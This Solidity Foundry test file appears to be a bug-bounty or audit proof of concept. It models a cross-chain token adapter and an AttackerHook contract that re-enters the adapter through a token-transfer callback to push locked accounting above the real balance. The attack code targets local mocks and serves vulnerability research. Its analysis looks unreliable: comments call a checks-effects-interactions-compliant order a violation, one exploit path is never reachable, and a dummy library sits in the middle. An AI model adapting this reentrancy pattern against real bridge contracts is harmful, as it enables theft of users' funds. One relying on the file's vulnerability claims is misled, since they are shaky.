// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test, console2 } from "forge-std/Test.sol";

/// @title ReentrantToken
/// @notice Minimal ERC20 stand-in that recreates the OFTAdapter scenario where the
///         underlying token piggybacks transfers with a callback to the recipient.
///         Mirrors the ERC777 `tokensReceived` hook shape on .transfer().
contract ReentrantToken {
    string public name = "Reentrant";
    string public symbol = "RT";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public callbackTarget;
    bool public reentryEnabled;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function setCallbackTarget(address _t) external {
        callbackTarget = _t;
    }

    function setReentryEnabled(bool _b) external {
        reentryEnabled = _b;
    }

    function mint(address _to, uint256 _v) external {
        totalSupply += _v;
        balanceOf[_to] += _v;
        emit Transfer(address(0), _to, _v);
    }

    function approve(address _spender, uint256 _v) external returns (bool) {
        allowance[msg.sender][_spender] = _v;
        emit Approval(msg.sender, _spender, _v);
        return true;
    }

    function transfer(address _to, uint256 _v) public returns (bool) {
        // Balance update FIRST (matches ERC777 + OZ SafeERC20 sequencing)
        balanceOf[msg.sender] -= _v;
        balanceOf[_to] += _v;
        emit Transfer(msg.sender, _to, _v);

        // Then optional callback to recipient during reentrancy window
        if (reentryEnabled && _to == callbackTarget && callbackTarget != address(0)) {
            IReentryHook(_to).onTokenReceived(msg.sender, _v);
        }
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _v) public returns (bool) {
        if (allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] -= _v;
        }
        balanceOf[_from] -= _v;
        balanceOf[_to] += _v;
        emit Transfer(_from, _to, _v);
        return true;
    }
}

interface IReentryHook {
    function onTokenReceived(address _from, uint256 _amount) external;
}

/// @title OFTAdapterMirror
/// @notice Reproduces the exact OFTAdapter._credit() CEI pattern:
///         outboundAmount decrement + token.safeTransfer without reentrancy guard.
///         Models OFTAdapter for an ArbitraryUnderlying token.
contract OFTAdapterMirror is IReentryHook {
    ReentrantToken public immutable innerToken;
    uint256 public outboundAmount;
    uint256 public totalCreditProcessed;

    address public owner;
    address public attackerContract;

    constructor(address _innerToken) {
        innerToken = ReentrantToken(_innerToken);
    }

    function setOwner(address _o) external {
        owner = _o;
    }

    function setAttacker(address _a) external {
        attackerContract = _a;
    }

    /// @dev Mirror of OFTAdapter._credit() — CEI violation:
    ///      1. Decrement outboundAmount BEFORE the external transfer call.
    ///      2. No reentrancy guard.
    function _credit(address _to, uint256 _amountToCreditLD) internal returns (uint256 amountReceivedLD) {
        unchecked {
            outboundAmount -= _amountToCreditLD;
        }
        totalCreditProcessed += _amountToCreditLD;
        innerToken.transfer(_to, _amountToCreditLD);
        return _amountToCreditLD;
    }

    /// @dev Mirror of OFTAdapter._debitSender() to seed outboundAmount for the PoC.
    function debitSender(uint256 _amount) external {
        innerToken.transferFrom(msg.sender, address(this), _amount);
        unchecked {
            outboundAmount += _amount;
        }
    }

    /// @dev Mirror of OFTAdapter._debitThis() — exploit entry point.
    ///      Push method uses availableToSend = balance - outboundAmount.
    function _debitThis(uint256 _minAmountToCreditLD) internal returns (uint256 amountDebitedLD, uint256 amountToCreditLD) {
        uint256 availableToSend = innerToken.balanceOf(address(this)) - outboundAmount;
        // Default impl: amountDebitedLD == amountToCreditLD == _removeDust(min)
        amountDebitedLD = availableToSend;
        amountToCreditLD = availableToSend;
        if (amountToCreditLD < _minAmountToCreditLD) {
            amountToCreditLD = _minAmountToCreditLD;
            amountDebitedLD = _minAmountToCreditLD;
        }
        unchecked {
            outboundAmount += amountToCreditLD;
        }
    }

    function debitThisPublic(uint256 _min) external {
        (uint256 debited, uint256 credited) = _debitThis(_min);
        console2.log("DEBIT_THIS debited");
        console2.log(debited);
        console2.log("DEBIT_THIS credited");
        console2.log(credited);
        console2.log("DEBIT_THIS outbound");
        console2.log(outboundAmount);
        console2.log("DEBIT_THIS balance");
        console2.log(innerToken.balanceOf(address(this)));
    }

    function creditPublic(address _to, uint256 _amount) external returns (uint256) {
        return _credit(_to, _amount);
    }

    /// @dev Exposed for the reentrancy test
    function onTokenReceived(address _from, uint256 _amount) external override {
        if (msg.sender != address(innerToken)) return;
        if (_from != attackerContract) return;
        console2.log("REENTRY outbound"); console2.log(outboundAmount);
        console2.log("REENTRY balance"); console2.log(innerToken.balanceOf(address(this)));
        console2.log("REENTRY available"); console2.log(innerToken.balanceOf(address(this)) - outboundAmount);
        // Exploit: re-enter debit via the inflated window
        (uint256 debited, uint256 credited) = _debitThis(0);
        console2.log("REENTRY_DEBIT debited"); console2.log(debited);
        console2.log("REENTRY_DEBIT credited"); console2.log(credited);
        console2.log("REENTRY_DEBIT outbound"); console2.log(outboundAmount);
        console2.log("REENTRY_DEBIT balance"); console2.log(innerToken.balanceOf(address(this)));
        console2.log("REENTRANT_BUG %d", outboundAmount > innerToken.balanceOf(address(this)) ? 1 : 0);
        console2.log("IMBALANCE_TOKENS %d",
            outboundAmount > innerToken.balanceOf(address(this)) ? outboundAmount - innerToken.balanceOf(address(this)) : uint256(0));
    }

    receive() external payable {}
}

library TransferLib {
    function x() internal pure returns (bool) { return true; }
}

/// @title AttackerHook
/// @notice Contract that holds the reentry latch and demonstrates the exploit.
contract AttackerHook is IReentryHook {
    OFTAdapterMirror public mirror;
    ReentrantToken public token;
    uint256 public reentryCreditAmount;
    bool public reentered;
    uint256 public imbalanceCaptured;

    constructor(OFTAdapterMirror _mirror, ReentrantToken _token) {
        mirror = _mirror;
        token = _token;
    }

    /// @dev Initiate the reentrancy attack:
    ///      1. Set reentry latch.
    ///      2. Call credit(), which triggers the token transfer callback.
    ///      3. In the callback, re-enter _debitThis via mirror.onTokenReceived.
    function attack(uint256 _creditAmount) external {
        reentryCreditAmount = _creditAmount;
        reentered = false;
        mirror.creditPublic(address(this), _creditAmount);
        reentered = true;
    }

    /// @dev Called by the ReentrantToken during transfer (the reentry entry point).
    function onTokenReceived(address _from, uint256 _amount) external override {
        if (msg.sender != address(token)) return;
        // Snapshot imbalance BEFORE the reentry
        console2.log("PRE_REENTRY outbound"); console2.log(mirror.outboundAmount());
        console2.log("PRE_REENTRY balance"); console2.log(token.balanceOf(address(mirror)));
        console2.log("PRE_REENTRY free");
        console2.log(token.balanceOf(address(mirror)) - mirror.outboundAmount());

        // Re-enter _debitThis via the inflated temporary window.
        // The creditPublic() above already decremented outboundAmount but the
        // outbound tokens haven't physically left yet.
        mirror.debitThisPublic(0);
        console2.log("REENTRY_DEBIT completed");

        console2.log("POST_REENTRY outbound"); console2.log(mirror.outboundAmount());
        console2.log("POST_REENTRY balance"); console2.log(token.balanceOf(address(mirror)));
        imbalanceCaptured = mirror.outboundAmount() > token.balanceOf(address(mirror))
            ? mirror.outboundAmount() - token.balanceOf(address(mirror))
            : 0;
        console2.log("IMBALANCE captured"); console2.log(imbalanceCaptured);
    }

    receive() external payable {}
}

/// @title OFTAdapterReentrancyInvariantTest
/// @notice Direction M PoC — demonstrates that OFTAdapterMirror._credit's CEI
///         violation allows reentrancy-via-token.transfer() callback to
///         inflate `availableToSend` and credit more `outboundAmount` than the
///         adapter actually holds.
contract OFTAdapterReentrancyInvariantTest is Test {
    ReentrantToken public token;
    OFTAdapterMirror public mirror;
    AttackerHook public attacker;
    address public owner = address(0xBEEF);

    function setUp() public {
        token = new ReentrantToken();
        mirror = new OFTAdapterMirror(address(token));
        attacker = new AttackerHook(mirror, token);

        // Setup:
        //   - mint 1000 tokens; lock 800 (outbound = 800); keep 200 sitting free in the adapter.
        //     So: balance=800, outbound=800 -> free=0
        //     Then transfer 200 more directly so: balance=1000, outbound=800 -> free=200.
        token.mint(owner, 1000e18);
        vm.prank(owner);
        token.approve(address(mirror), 800e18);
        vm.prank(owner);
        mirror.debitSender(800e18); // outboundAmount = 800, balance (mirror) = 800
        vm.prank(owner);
        token.transfer(address(mirror), 200e18); // top up: balance=1000, outbound=800 -> free=200

        // Configure the attack surface
        mirror.setAttacker(address(attacker));
        token.setCallbackTarget(address(attacker)); // attacker handles reentry via its own onTokenReceived
        token.setReentryEnabled(true);
    }

    function test_DirectionM_ReentrancyInflatesAvailableToSend() public {
        uint256 balanceBefore = token.balanceOf(address(mirror));
        uint256 outboundBefore = mirror.outboundAmount();
        uint256 freeBefore = balanceBefore - outboundBefore;

        console2.log("BEFORE balance"); console2.log(balanceBefore);
        console2.log("BEFORE outbound"); console2.log(outboundBefore);
        console2.log("BEFORE free"); console2.log(freeBefore);
        assertEq(freeBefore, 200e18, "200e18 tokens free before attack");


        // A normal user caused a credit of 100e18 from a cross-chain message,
        // paying the attacker as the recipient
        attacker.attack(100e18);

        uint256 balanceAfter = token.balanceOf(address(mirror));
        uint256 outboundAfter = mirror.outboundAmount();
        int256 freeAfter = int256(balanceAfter) - int256(outboundAfter);

        console2.log("AFTER balance"); console2.log(balanceAfter);
        console2.log("AFTER outbound"); console2.log(outboundAfter);
        console2.log("AFTER free_int"); console2.log(uint256(freeAfter));
        console2.log("REENTRANT_BUG %d", outboundAfter > balanceAfter ? 1 : 0);
        console2.log("IMBALANCE_TOKENS %d",
            outboundAfter > balanceAfter ? outboundAfter - balanceAfter : uint256(0));
        console2.log("SUBMIT_READY 0");

        // CRITICAL INVARIANT: outboundAmount <= balance (should always hold)
        assertLe(outboundAfter, balanceAfter, "INVARIANT VIOLATED: outbound > balance");
    }
}
